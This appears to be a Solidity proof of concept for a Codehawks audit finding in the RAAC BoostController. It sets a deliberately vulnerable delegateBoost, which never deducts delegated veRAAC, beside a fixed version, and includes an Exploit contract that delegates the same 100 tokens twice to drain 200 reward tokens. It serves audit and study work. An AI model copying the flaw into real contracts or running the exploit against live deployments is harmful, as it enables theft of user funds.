// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  RAAC BoostController — Codehawks 2025-02
    delegateBoost records a delegation without deducting it from the caller's
    remaining boost. The same 100 veRAAC is delegated to two recipients.
    claimRewards pays the sum, 200 reward tokens, out of the pool.
*/

contract Reward {
    string public symbol = "RWD";
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract VeToken {
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }
}

contract BoostController {
    struct UserBoost {
        uint256 amount;
        uint256 expiry;
        address delegatedTo;
    }

    VeToken public ve;
    Reward public reward;
    mapping(address => mapping(address => UserBoost)) public userBoosts;
    mapping(address => uint256) public totalDelegated;

    constructor(VeToken _ve, Reward _reward) {
        ve = _ve;
        reward = _reward;
    }

    /// delegateBoost from BoostController.sol.
    function delegateBoost(address to, uint256 amount, uint256 duration) external {
        if (to == address(0)) revert("InvalidPool");
        if (amount == 0) revert("InvalidBoostAmount");
        if (duration < 1 || duration > 365 days) revert("InvalidDelegationDuration");
        uint256 userBalance = ve.balanceOf(msg.sender);
        if (userBalance < amount) revert("InsufficientVeBalance");
        UserBoost storage delegation = userBoosts[msg.sender][to];
        if (delegation.amount > 0) revert("BoostAlreadyDelegated");
        // @> VULN: amount is stored for `to` and never deducted from the boost that can still be delegated
        delegation.amount = amount;
        delegation.expiry = block.timestamp + duration;
        delegation.delegatedTo = to;
        totalDelegated[msg.sender] += amount;
    }

    function claimRewards() external returns (uint256 paid) {
        paid = totalDelegated[msg.sender];
        totalDelegated[msg.sender] = 0;
        reward.transfer(msg.sender, paid);
    }
}

contract BoostControllerFixed {
    struct UserBoost {
        uint256 amount;
        uint256 expiry;
        address delegatedTo;
    }

    VeToken public ve;
    Reward public reward;
    mapping(address => mapping(address => UserBoost)) public userBoosts;
    mapping(address => uint256) public remaining;
    mapping(address => uint256) public totalDelegated;

    constructor(VeToken _ve, Reward _reward) {
        ve = _ve;
        reward = _reward;
    }

    function setRemaining(address user, uint256 amount) external {
        remaining[user] = amount;
    }

    function delegateBoost(address to, uint256 amount, uint256 duration) external {
        if (to == address(0)) revert("InvalidPool");
        if (amount == 0) revert("InvalidBoostAmount");
        if (duration < 1 || duration > 365 days) revert("InvalidDelegationDuration");
        if (ve.balanceOf(msg.sender) < amount) revert("InsufficientVeBalance");
        if (remaining[msg.sender] < amount) revert("InsufficientVeBalance");
        UserBoost storage delegation = userBoosts[msg.sender][to];
        if (delegation.amount > 0) revert("BoostAlreadyDelegated");
        remaining[msg.sender] -= amount;
        delegation.amount = amount;
        delegation.expiry = block.timestamp + duration;
        delegation.delegatedTo = to;
        totalDelegated[msg.sender] += amount;
    }

    function claimRewards() external returns (uint256 paid) {
        paid = totalDelegated[msg.sender];
        totalDelegated[msg.sender] = 0;
        reward.transfer(msg.sender, paid);
    }
}

contract Exploit {
    VeToken public ve;
    Reward public reward;
    BoostController public boost;
    address public user2 = address(0xB2);
    address public user3 = address(0xB3);
    uint256 public firstDelegation;
    uint256 public secondDelegation;
    uint256 public veLeft;
    uint256 public paid;

    constructor() {
        ve = new VeToken();
        reward = new Reward();
        boost = new BoostController(ve, reward);
        ve.mint(address(this), 100 ether);
        reward.mint(address(boost), 200 ether);
    }

    function run() external {
        uint256 ignoreExpiry;
        address ignoreTo;
        boost.delegateBoost(user2, 100 ether, 7 days);
        (firstDelegation, ignoreExpiry, ignoreTo) = boost.userBoosts(address(this), user2);
        boost.delegateBoost(user3, 100 ether, 7 days);
        (secondDelegation, ignoreExpiry, ignoreTo) = boost.userBoosts(address(this), user3);
        veLeft = ve.balanceOf(address(this));
        paid = boost.claimRewards();
        require(firstDelegation == 100 ether, "first");
        require(secondDelegation == 100 ether, "second");
        require(veLeft == 100 ether, "not deducted");
        require(paid == 200 ether, "paid");
        require(reward.balanceOf(address(this)) == 200 ether, "balance");
    }
}
